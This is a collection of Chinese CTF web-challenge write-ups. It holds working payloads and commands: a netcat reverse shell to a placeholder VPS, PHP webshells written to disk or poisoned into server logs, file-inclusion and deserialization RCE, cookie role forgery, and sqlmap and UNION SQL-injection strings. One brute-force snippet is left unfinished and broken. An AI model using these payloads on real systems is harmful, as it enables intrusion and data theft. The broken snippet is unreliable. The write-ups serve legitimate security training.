            encoded = btoa('aB3' + encoded + 'qW9').substr(2);
            return btoa(encoded) === correctPassword;
        }

        const enteredPassword = document.getElementById('password').value;
        const messageElement = document.getElementById('message');

        if (!validatePassword(enteredPassword)) {
            e.preventDefault();
            messageElement.textContent = "Login failed! Incorrect password.";
            messageElement.className = "message error";
        }
    });
</script>
```

发现字符串`SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=`，并且用`JavaScript`进行逻辑加密，我们需要逆向破解。

```javascript
let encoded = btoa(input);                         // 第1层 获取输入
encoded = btoa(encoded + 'xH7jK').slice(3);        // 第2层 +'xH7jK'后截断前3字符
encoded = btoa(encoded.split('').reverse().join('')); // 第3层 反转字符串
encoded = btoa('aB3' + encoded + 'qW9').substr(2); // 第4层 拼接前后缀 再截断前2字符
return btoa(encoded) === correctPassword;          // 第5层 验证密码
```

在`JavaScript`中，`btoa()` 是 Base64 编码，`atob()` 是解码。先用`Python`进行`base64`解码。

```python
>>> from base64 import b64decode
>>> b64decode('SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=')
b'IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5'
```

由于`substr(2)`去掉前两个字符，完整的字符串是`??IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5`。

`Base64`编码的长度必须是 4 的倍数。当前长度是43 → 需要补一个 `=` 让编码长度达到44。

编写`Python`代码暴力破解。利用笛卡尔积排序法逐个爆破可能被删除的前两位字符，找出`base64`解码后前三位是"aB3"的所有字符串，再验证其是否可以`base64`解码，以及`base64`解码后的字符是否合法。

```python
import itertools
from base64 import b64decode

L4 =  # 'IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5'
s = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
for combo in itertools.product(s, s):
    passwd_4 = ''.join(combo) + L4
    if str(b64decode(passwd_4)).find("aB3") > 0:
        # print(passwd_4)
        try:
            passwd_3 = b64decode(passwd_4).decode()
            if passwd_3.startswith('aB3') and passwd_3.endswith('qW9'):
                L3 = passwd_3[3:-3]
                print("L3 is Found! " + L3)
        except:
            continue
```

运行结果如下：

```
L3 is Found! PT13U3FkRFM0SlRSNjEwTUY=
```

对去掉前后缀字符串后的L3进行`base64`解码，再将字符串进行翻转得到`L2`。

```python
>>> L3 = 'PT13U3FkRFM0SlRSNjEwTUY='
>>> b64decode(L3)
b'==wSqdDS4JTR610MF'
>>> L2 = b64decode(L3)[::-1]
>>> L2
b'FM016RTJ4SDdqSw=='
```

第一层密文在加密前添加了后缀字符串"xH7jK"，并在加密后去掉了前三位，所以我们需要先爆破前三位，再去掉后5位，然后去掉所有包含字节或特殊符号的爆破结果，删除base64的固定字符，逐步缩小正确密文的范围。

```python
import re
import itertools
from base64 import b64decode

L2 = 'FM016RTJ4SDdqSw=='
s = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
for combo in itertools.product(s,s,s):
     passwd_1=''.join(combo) + L2
     passwd_0=str(b64decode(passwd_1))[slice(0,-6)]   # 解码后去掉最后5个字符
     passwd=passwd_0[slice(2, None)]  # 去掉前2个字符
     if re.match(r'^[A-Za-z0-9]{3}', passwd):
          filtered = [s for s in str(b64decode(passwd)) if '\\' not in s]
          passwd="".join(filtered)[slice(2,None)]
          if
          print(passwd[0:-1])
```

这些密码还是太多了。算了，直接整理一下`Python`代码，准备爆破吧。

```python
import re
import requests
import itertools
from base64 import b64decode
from bs4 import BeautifulSoup

correct = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
# Layer 5: btoa(L4) = correct → L4 = base64.b64decode(correct)
L4 = b64decode(correct).decode()  
print("L4:", L4)  # IpUFQxM1UzRmtSRk0wU2xSU05qRXduVVVk9cVc5
# Layer 4: L4 = b64encode('aB3' + L3 + 'qW9')[2:]
# So full_b64 = ?? + L4, and len(full_b64) % 4 == 0
s = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
for combo in itertools.product(s, s):
    passwd_4 = ''.join(combo) + L4
    if str(b64decode(passwd_4)).find("aB3") > 0:
        # print(passwd_4)
        try:
            passwd_3 = b64decode(passwd_4).decode()
            if passwd_3.startswith('aB3') and passwd_3.endswith('qW9'):
                L3 = passwd_3[3:-3]
                print("L3:", L3)  # PT13U3FkRFM0SlRSNjEwTUY=
        except:
            continue
# Layer 3: L3 = b64encode(reverse(L2))
# So reverse(L2) = base64.b64decode(L3)
rev_L2 = b64decode(L3).decode()
L2 = rev_L2[::-1]
print("L2:", L2)  # FM016RTJ4SDdqSw==
# Layer 2: L2 = b64encode(L1 + 'xH7jK')[3:]
# Again, need to recover full b64

url = 'https://e858b1f7-9a9b-4bce-b913-25323b065280.challenge.ctf.show/check.php'
# 配置HTTP协议的代理，监听本地8080端口
proxies = {'http': "http://127.0.0.1:8080"}
heads = {'User-Agent': "ctf-show-brower"}

for combo in itertools.product(s,s,s):
    passwd_1=''.join(combo) + L2
    passwd_0=str(b64decode(passwd_1))[slice(0,-6)]   # 解码后去掉最后5个字符
    passwd=passwd_0[slice(2, None)]  # 去掉前2个字符
    if re.match(r'^[A-Za-z0-9]{3}', passwd):
        filtered = [s for s in str(b64decode(passwd)) if '\\' not in s]
        passwd="".join(filtered)[slice(2,None)][0:-1]
        # print(passwd)
        if passwd == 'T17316':
            response = requests.post(
                url=url,
                data={"username": "admin", "password":passwd},
                proxies=proxies,
                headers=heads,
                verify=False)  # 如果报错InsecureRequestWarning添加verify=False
            html = response.text
            soup = BeautifulSoup(html, 'html.parser')
            text = soup.get_text()
            match = re.search(r'CTF\{[^}]+\}', text)
            if match:
                print("Flag:", match.group(0))  
                # Flag: CTF{base64_brute_force_success}
```

密码是T17316。我这里加了个`if`条件，这个密码在我们计算得到的密码表中。

```
L4: IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5
L3: PT13U3FkRFM0SlRSNjEwTUY=
L2: FM016RTJ4SDdqSw==
E:\Anaconda3\Lib\site-packages\urllib3\connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
Flag: CTF{base64_brute_force_success}
```

提交`CTF{base64_brute_force_success}`即可。

------

### HTTPS中间人攻击

下载题目附件解压缩后得到两个文件：`sslkey.log`和`target.pcap`。

用`WireShark`打开`target.pcap`，发现有一行红色高亮的数据：

```
14	0.020913 127.0.0.1	127.0.0.1	TCP	54	443 → 48908 [RST] Seq=2845 Win=0 Len=0
```

在`WireShark`菜单栏依次点击 编辑—首选项—Protocols—TLS，在右侧的Transport Layer Security中的(Pre)-Master-Secret log filename导入文件`sslkey.log`并应用。随后发现多了两条HTTP数据。

```
9 0.008883 127.0.0.1 127.0.0.1 HTTP	260	POST / HTTP/1.1  (application/x-www-form-urlencoded)

11	0.020638	127.0.0.1	127.0.0.1	HTTP	543	HTTP/1.1 200 OK  (text/html)
```

追踪HTTP流，可以看到以下信息：

```
POST / HTTP/1.1
Host: ctfshow.com
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

flag=CTF{https_secret_data}
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.10.12
Date: Mon, 07 Jul 2025 16:46:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5
Connection: close

OK...
```

提交`CTF{https_secret_data}`即可。

------

### Cookie伪造

进入靶机后是一个登录界面，默认账号被填写为`guest`，密码也是`guest`，登录成功后看到信息：

> Login successful! welcome guest user

用`Chrome`的`Network`查看`check.php`的`Headers`信息，发现`Request Headers`中的`Cookie`值是`PHPSESSID=9e97ac68f33c819ccbfc49194a943163`，`Response Headers`中的`Set-Cookie`值包含`role=guest;`。我们用`HackBar`构造`POST`请求，URL请求为靶机链接的`/check.php`，在`Body`中填写`username=guest&password=guest`，点击`MODIFY HEADER`设置请求头`Cookie`值为`PHPSESSID=9e97ac68f33c819ccbfc49194a943163;role=admin;`。登录成功后看到信息：

> You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}

提交`CTF{cookie_injection_is_fun}`即可。

------

### happy2026

`PHP`代码审计题，关键难点在于判断条件`$year==2026 && $year!==2026 && is_numeric($year))`。

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$happy = $_GET['happy'];
$new = $_GET['new'];
$year = $_GET['year'];

if($year==2026 && $year!==2026 && is_numeric($year)){
    include $happy[$new[$year]];
}
```

`==`只要值“相等”即可，不要求类型相同。比如`'2026' == 2026`就可以绕过。`PHP`中的`==`转换规则是从左到右读取字符串，直到遇到非数字字符为止，所以 `"2026e0" == 2026`的结果为`true`。

`!==`要求值或类型不同。比如`$year` 不能是整数 `2026`，但可以是字符串 `"2026"`。

`is_numeric($year)`要求 `$year` 是数字或数字字符串（如 `"2026"`, `"2026.0"`, `"+2026"` 等都返回 `true`）

构造`payload`求解，`/?year=2026e0&new[2026e0]=0&happy[0]=php://filter/convert.base64-encode/resource=flag.php`。靶机的回显信息如下：

```
PD9waHAgJGZsYWc9J2N0ZnNob3d7ZGYzMzU5YWYtYTE4Zi00Y2E3LWI3MGItMTEyZGRhOTVjMjAxfSc7Cg==
```

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgJGZsYWc9J2N0ZnNob3d7ZGYzMzU5YWYtYTE4Zi00Y2E3LWI3MGItMTEyZGRhOTVjMjAxfSc7Cg=='));"
string(61) "<?php $flag='ctfshow{df3359af-a18f-4ca7-b70b-112dda95c201}';
"
```

提交`ctfshow{df3359af-a18f-4ca7-b70b-112dda95c201}`即可。

------

### 一句话木马变形

输入`system('ls');`看到执行结果如下：

```
Error: Invalid characters detected! Only letters, numbers, underscores ,parentheses and semicolons are allowed.
```

如果省略掉引号呢？输入`system(ls);`看到执行结果如下：

```html
<br />
<b>Warning</b>:  Use of undefined constant ls - assumed 'ls' (this will throw an Error in a future version of PHP) in <b>/var/www/html/index.php(107) : eval()'d code</b> on line <b>1</b><br />
flag.php
index.php
```

无参RCE通过PHP内置函数拼凑出代码逻辑，可以实现执行后门代码而不依赖于外部参数来执行。

```php
show_source(next(array_reverse(scandir(current(localeconv())))));
```

通过`localeconv()`获取系统本地化数组 → 取第一个元素 .（当前目录）→ 扫描当前目录文件 → 反转数组 → 取第二个文件 → 显示其源码。

```html
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br />$flag&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"CTF{shell_code_base64_bypass}"</span><span style="color: #007700">;</span>
</span>
</code>
```

提交`CTF{shell_code_base64_bypass}`即可。

------

### 反弹shell构造

靶机可以执行命令但是没有回显，只能看到`execute success!`。

正常的反弹shell，需要一个有公网IP的VPS，并开放相应的端口`port`。

执行命令`nc -c sh VPS-IP port`，并在VPS中输入`nc -lv port`监听，连接成功后直接执行命令`ls`和`cat flag.php`即可。

如果没有公网IP的服务器，是没有办法反弹shell的，可以用以下办法求解此题。外单内双写入一句话木马。在`Bash`的单引号中，所有字符都被原样保留，不会进行任何变量扩展或转义。

```bash
echo '<?php @eval($_POST["t0ur1st"]);?>' > shell.php
```

执行命令后，会在靶机服务器生成一个`shell.php`文件。用`AntSword`连接靶机即可获取`flag`。

或者用`HackBar`构造`POST`请求，传递参数`t0ur1st=system('ls');`，靶机的回显信息如下：

```
flag.php index.php shell.php
```

继续构造`POST`请求`t0ur1st=var_dump(file_get_contents('flag.php'));`，右键查看网页源码：

```php
string(43) "<?php

$flag = "CTF{reverse_shell_use_nc}";"
```

提交`CTF{reverse_shell_use_nc}`即可。

------

### 管道符绕过过滤

进入靶机后，输入`ls`，看到回显内容`ls ls execute success!`。好家伙，这是默认自带了`ls`命令。

输入`/`可以看到根目录信息，再输入`/var/www/html`可以看到回显信息如下：

```bash
ls /var/www/html execute success!
flag.php
index.php
```

那我们输入`; cat flag.php`可以执行`ls`和`cat flag.php`这两条命令。查看网页源码发现关键注释：

```php
<?php
$flag = "CTF{no_space_to_execute_shell_commands}";
```

或者输入`| cat flag.php`只执行一条`cat flag.php`命令。查看网页源码发现关键注释：

```php+html
<div class="result">ls | cat flag.php execute success!<br><?php
$flag = "CTF{no_space_to_execute_shell_commands}";</div>
```

提交`CTF{no_space_to_execute_shell_commands}`即可。

------

### 驷马难追

PHP代码审计题。首先num=114514绕过，然后需要`intval(num)==1919810`获取`flag`。

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
}
```

这道题的`Payload`是`?num=114514%2b1805296`，通过GET方式传值的时候，+号会被浏览器处理为空，所以需要转换为`%2b`的形式。而114514+1805296=1919810，这样就可以完美绕过那三个判断条件。

- **弱比较时**，`"114514+1805296"` 被转为 `114514`，满足 `== 114514`。
- **`assert` 执行时**，`114514+1805296` 被当作算术表达式，结果为 `1919810`，满足 `==1919810`。
- **`check()`** 允许 `+`，不包含禁用字符。

提交`ctfshow{e506febd-bfa4-4d07-93f7-1a2c88075b49}`即可。

------

### Webshell

PHP代码审计后，发现这道题的考点是PHP反序列化。

```php
<?php 
    error_reporting(0);
    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

当PHP生成一个 `Webshell` 对象时，会自动调用 `__construct()` → `init()`。`init()` 检查 `$this->cmd` 是否包含 `flag`（忽略大小写），若不包含，则执行命令。最终通过 `shell_exec($this->cmd)` 执行系统命令。

编写PHP反序列化代码求解，得到`O:8:"Webshell":1:{s:3:"cmd";s:12:"cat * >1.txt";}`。

```php
<?php 
class Webshell {
    public $cmd = 'cat * >1.txt';
}
$a = new Webshell();
echo serialize($a);
?>
```

访问`/1.txt`可以看到`flag`信息。

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{050cfa45-a8cb-4a68-8444-c8f02703dd16}';
<?php 
    error_reporting(0);

    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }

?>
```

提交`ctfshow{050cfa45-a8cb-4a68-8444-c8f02703dd16}`即可。

------

### easyPytHon_P

`python`代码审计题，考察在Flask环境中如何利用`subprocess.run()`执行命令。

```python
源码在此：

from flask import request
cmd: str = request.form.get('cmd')
param: str = request.form.get('param')
# --------------------------- Don't modify ↑ them ↑! But you can write your code ↓
import subprocess, os
if cmd is not None and param is not None:
    try:
        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
        print('Done!')
    except subprocess.TimeoutExpired:
        print('Timeout!')
    except:
        print('Error!')
else:
    print('No Flag!')

如果环境出现故障，请访问<a href="/recover">这里</a>尝试恢复。

大菜鸡敬上！
```

subpeocess模块下的run函数可以执行命令，其具体的参数有很多：第一个参数`args`是个`list`，包括要执行的命令`cmd`，命令参数`param`，当前文件路径`__file__`；而`cwd`为当前工作路径，`os.getcwd()`是返回进程的当前工作目录；`timeout`表示等待超时的时间设置为5s。

用`HackBar`构造`POST`请求，执行命令`ls -l`，`POST`数据为`cmd=ls&param=-l`，靶机显示内容如下：

```
-rw-rw-r-- 1 root root 490 Jan 18 09:27 evilSource.py Done!
```

执行命令`ls ./`查看当前路径的文件目录，`POST`数据为`cmd=ls&param=./`，靶机显示内容如下：

```
evilSource.py ./: app.py evilSource.py flag.txt start.sh Done!
```

执行命令`cat flag.txt`查看`flag`文件，POST数据为`cmd=cat&param=flag.txt`，靶机显示内容如下：

```
ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str = ['cat', 'flag.txt'][0] param: str = ['cat', 'flag.txt'][1] # ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓ import subprocess, os if cmd is not None and param is not None: try: tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5) print('Done!') except subprocess.TimeoutExpired: print('Timeout!') except: print('Error!') else: print('No Flag!')Done!
```

提交`ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282}`即可。

------

### web1

进入靶机后看到一行信息：where is flag?

右键检查网页元素，或`view-source`查看网页源码。

```
where is flag?

<!-- 
Y3Rmc2hvd3thNzNjZWM2ZC04YjQyLTQzMTktYWYzZC0xYmQyMjk2Nzk1MzN9-->
```

直接用PHP命令将注释中字符串`base64`解码即可获得`flag`。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('Y3Rmc2hvd3thNzNjZWM2ZC04YjQyLTQzMTktYWYzZC0xYmQyMjk2Nzk1MzN9'));"
string(45) "ctfshow{a73cec6d-8b42-4319-af3d-1bd229679533}"
```

提交`ctfshow{a73cec6d-8b42-4319-af3d-1bd229679533}`即可。

------

### web2

靶机直接给出一个登录框，网页源码如下：

```html
<html lang="zh-CN">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web2</title>
</head>
<body>
    <center>
    <h2>ctf.show_web2</h2>
    <hr>
        <form method="post">
        用户名:<input type="text" name="username"><br><br>
        密&nbsp;&nbsp;&nbsp;码:<input type="password" name="password"><br><br>
        <input type="submit" value="登陆">  
    </form>
    </center>
</body>
</html>
```

直接使用`sqlmap`进行爆破求解。

查询所有数据库：

```bash
sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" --dbs
```

一路按Y，可以在终端中看到以下输出：

```
[INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.20.1, PHP 7.3.11
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[INFO] fetching database names
available databases [6]:
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] web2
```

查询指定数据库`web2`中的所有表信息：

```bash
sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 --tables
```

可以在终端中看到以下输出：

```
[WARNING] reflective value(s) found and filtering out
Database: web2
[2 tables]
+------+
| user |
| flag |
+------+
```

查询指定数据库`web2`中指定表`flag`的所有列信息：

```bash
sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T flag --columns
```

可以在终端中看到以下输出：

```
[WARNING] reflective value(s) found and filtering out
Database: web2
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
```

查询指定数据库`web2`中指定表`flag`的指定字段`flag`信息：

```bash
sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T flag -C flag --dump
```

可以在终端中看到以下输出：

```
[WARNING] reflective value(s) found and filtering out
Database: web2
Table: flag
[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1} |
+-----------------------------------------------+
```

提交`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`即可。

来都来了顺带把账号和密码一块扒啦。

```bash
$sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T user -C username --dump
+----------+
| username |
+----------+
| ctfshow  |
+----------+

$sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T user -C password --dump
+----------+
| password |
+----------+
| 6yhnbgt5 |
+----------+
```

输入账号密码登录进去后，靶机只会显示一行信息：欢迎你，ctfshow。

如果选择手动注入的话，多次尝试后发现是单引号闭合并用#注释，所以`' or 1=1 #`也可以直接登录，并且账号和密码都存在注入点。

判断字段列数，通过`' or 1=1 order by 3#`有回显而改为4没有回显，可知字段数为3。

判断回显位置，使用`' or 1=1 union select 1,2,3#`，通过回显可以推出显示位为2。

获取数据库名称`web2`和数据库版本信息`10.3.18-MariaDB`。

```
' or 1=1 union select 1,database(),3 #

' or 1=1 union select 1,version(),3 #
```

查表名，得到回显内容`flag,user`。

```
' or 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 #
```

查列名，得到回显内容`flag`。

```
' or 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3 #
```

查字段信息，得到回显内容`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`。

```
' or 1=1 union select 1,(select flag from web2.flag),3 #
```

提交`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`即可。

------

### web3

进入靶机后看到网页内容：

```php+HTML
ctf.show_web3
<?php include($_GET['url']);?>
```

我们可以利用`php://input`伪协议执行PHP代码。

用`Burp Suite`抓包靶机的`/?url=php://input`，添加数据`<?php system("ls"); ?>`，即可在靶机执行`ls`命令，查看当前目录下所有文件。

```
GET /?url=php://input HTTP/1.1
Host: 1a82d67f-b116-4685-8936-50d442df7b2f.challenge.ctf.show
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: keep-alive
Content-Length: 23

<?php system("ls");?>
```

知道当前目录存在`ctf_go_go_go`和`index.php`后，无需再使用`php://input`伪协议读取`flag`信息了。

直接用`/?url=ctf_go_go_go`获取文件内容`ctfshow{c1624ce6-a56b-4852-a313-dfeb83565500}`。

------

### web4

进入靶机后看到网页内容：

```php+HTML
ctf.show_web4
<?php include($_GET['url']);?>
```

 访问web服务器的日志文件（Nginx日志文件的默认位置是`/var/log/nginx/access.log`）

```
172.12.0.2 - - [19/Jan/2026:08:04:10 +0000] "GET / HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" 172.12.0.2 - - [19/Jan/2026:08:08:55 +0000] "GET /url=/var/log/nginx/access.log HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
```

使用`BurpSuite`在请求头信息的`User-Agent`中插入PHP木马`<?php @eval($_POST['shell']);?>`。

随后web服务器的日志文件内容会多一条访问记录，但不会显示刚刚插入的一句话木马，因为日志文件中的代码会被执行但不会显示。

用`AntSword`连接靶机，右键启动虚拟终端。

```
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux 9978efc679b3 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www) $ ls ./
flag.txt
html
localhost
(www-data:/var/www) $ cat flag.txt
ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}
```

提交`ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}`即可。

------

### web5

进入靶机后，看到页面内容如下：

```php+HTML
where is flag?
<?php
error_reporting(0);
?>
<html lang="zh-CN">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web5</title>
</head>
<body>
    <center>
    <h2>ctf.show_web5</h2>
    <hr>
    <h3>
    </center>
    <?php
        $flag="";
        $v1=$_GET['v1'];
        $v2=$_GET['v2'];
        if(isset($v1) && isset($v2)){
            if(!ctype_alpha($v1)){
                die("v1 error");
            }
            if(!is_numeric($v2)){
                die("v2 error");
            }
            if(md5($v1)==md5($v2)){
                echo $flag;
            }
        }else{  
            echo "where is flag?";
        }
    ?>
</body>
</html>
```

显然，这是道PHP的MD5绕过题，考察的是对PHP类型比较和MD5特性的理解。

关键漏洞点在于：PHP 的弱类型比较（==）+ MD5 的 `0e` 哈希碰撞。

 `QNKCDZO` 是最经典且符合`ctype_alpha()`的选择，其MD5是 `0e830400451993494058024219903391` → 符合`0e\d+`。`240610708`是符合`is_numeric()`的纯数字，其MD5值也符合`0e\d+`。

- `$v1 = "QNKCDZO"` （纯字母，MD5 = `0e830400451993494058024219903391`）
- `$v2 = "240610708"` （纯数字，MD5 = `0e462097431906509019562988736854`）

```
"0e830400451993494058024219903391" == "0e462097431906509019562988736854"
// 在PHP中使用==弱类型比较时,它们看起来像科学计数法（以 0e 开头，后面全是数字），PHP会把它们当作数字来比较。 → true！因为它们的数值都等于0
```

因此`Payload`是`/?v1=QNKCDZO&v2=240610708`。

发送请求后得到`ctfshow{911b4bff-9313-43b0-8ba8-819603ef5f98}`。

------

### web6

进入靶机后看到一个跟之前的web2题一样的登录框。

直接使用`sqlmap`进行爆破求解。在`sqlmap`中，参数`-v`用于设置输出详细级别，取值范围是0~6，控制`sqlmap`在终端中打印多少信息。`--level`设置测试等级，取值范围是0~5，控制`sqlmap`对哪些`HTTP`参数进行`SQL`注入测试。

需要分析请求是否被WAF拦截时使用 `-v 3`看清通信过程；而自动化时通常使用`-v 0`或默认的`-v 1`。

|  值  |       含义        |              -v（Verbosity Level）输出内容说明               |
| :--: | :---------------: | :----------------------------------------------------------: |
|  0   |      Silent       | 仅显示 成功注入结果 和 严重错误，几乎无日志。适合自动化脚本。 |
|  1   |  Default（默认）  |     显示基本进度、检测到的注入点、数据库类型等关键信息。     |
|  2   |      Verbose      | 在 level 1 基础上，增加 使用的 payload 技术（如 boolean-based、time-based）、DBMS 指纹识别过程。 |
|  3   |   More verbose    | 显示 HTTP 请求头 和 响应头（不含 body）。便于分析请求是否被 WAF 拦截。 |
|  4   |       Debug       | 显示 完整的 HTTP 请求与响应（含 body），包括原始 payload。对调试绕过非常有用。 |
|  5   | Extremely verbose |    显示 内部 payload 构造细节、编码过程、测试逻辑分支等。    |
|  6   |    All details    | 最高详细级别，包含 所有中间变量、SQL 语句构造、异常堆栈 等，用于开发者调试。 |

以上是`-v`的取值含义，而`--level`的取值含义如下：

|  值  |                     测试的参数范围                      |                             说明                             |
| :--: | :-----------------------------------------------------: | :----------------------------------------------------------: |
|  1   |       - GET 参数（URL query） - POST 参数（body）       | 默认级别，只测试最明显的输入点（如 URL 参数（GET请求）和 POST body 参数）。 |
|  2   |               Level 1 + Cookie 头中的参数               |    会尝试对 Cookie 值进行注入测试（如 `PHPSESSID=xxx`）。    |
|  3   |              Level 2 + User-Agent Referer               | 常见WAF绕过场景：有些系统会从HTTP请求头读取数据并拼接到SQL中（增加对 User-Agent、Referer等HTTP头的测试）。 |
|  4   |      Level 3 + 其他 HTTP 头（如 Accept, Host 等）       |                 开始测试不太常见的头部字段。                 |
|  5   | Level 4 + 所有可提取的参数 （包括自定义头、路径片段等） |  最大范围测试，可能产生大量请求，容易触发 WAF 或日志告警。   |

查询所有数据库：

```bash
sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --dbs --tamper=space2comment --level=3 -v 3
```

可以在终端中看到以下输出：

```
[DEBUG] performed 33 queries in 14.46 seconds
available databases [6]:
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] web2
```

查询指定数据库`web2`中的所有表信息：

```bash
sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 --tables
```

可以在终端中看到以下输出：

```
[DEBUG] performed 33 queries in 15.34 seconds
Database: web2
[2 tables]
+------+
| user |
| flag |
+------+
```

查询指定数据库`web2`中指定表`flag`的所有列信息：

```bash
